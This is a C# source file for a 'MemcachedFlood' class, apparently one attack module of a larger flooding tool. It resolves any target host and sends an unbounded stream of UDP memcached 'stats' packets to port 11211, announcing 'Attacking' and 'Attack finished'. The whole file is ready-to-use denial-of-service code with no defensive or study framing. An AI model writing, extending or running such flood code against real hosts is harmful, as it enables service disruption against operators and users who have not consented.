using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ConnectFlood
{
    public class MemcachedFlood : IAttack
    {
        public void StartFlood(string target, int packetCount, int speed, string none)
        {
            target = CleanTarget(target);
            string ipAddress = ResolveTarget(target);
            if (ipAddress == null)
            {
                Console.WriteLine($"[Memcached] Failed to resolve {target}");
                return;
            }

            Console.WriteLine($"[Memcached] Attacking {target} ({ipAddress}):11211 | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms");

            IPEndPoint memcachedServer = new IPEndPoint(IPAddress.Parse(ipAddress), 11211);
            UdpClient udpClient = new UdpClient();
            int sentPackets = 0;

            while (packetCount == -1 || sentPackets < packetCount)
            {
                try
                {
                    byte[] memcachedPacket = GenerateMemcachedRequest();
                    udpClient.Send(memcachedPacket, memcachedPacket.Length, memcachedServer);
                    Console.WriteLine($"[Memcached] Packet {sentPackets + 1} sent to {ipAddress}:11211");
                    sentPackets++;
                }
                catch (SocketException ex)
                {
                    Console.WriteLine($"[Memcached] Error: {ex.Message}");
                    break;
                }
                if (speed > 1)
                    Thread.Sleep(speed);
            }

            udpClient.Close();
            Console.WriteLine("[Memcached] Attack finished.");
        }

        private byte[] GenerateMemcachedRequest()
        {
            string request = "stats\r\n";
            return Encoding.ASCII.GetBytes(request);
        }

        private string ResolveTarget(string target)
        {
            try
            {
                IPAddress[] addresses = Dns.GetHostAddresses(target);
                foreach (IPAddress addr in addresses)
                {
                    if (addr.AddressFamily == AddressFamily.InterNetwork)
                    {
                        return addr.ToString();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Memcached] DNS Resolution Error: {ex.Message}");
            }
            return null;
        }

        private string CleanTarget(string target)
        {
            if (target.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
            {
                target = target.Substring(7);
            }
            else if (target.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            {
                target = target.Substring(8);
            }
            int colonIndex = target.IndexOf(':');
            if (colonIndex > 0)
            {
                target = target.Substring(0, colonIndex);
            }

            return target.TrimEnd('/');
        }

    }
}
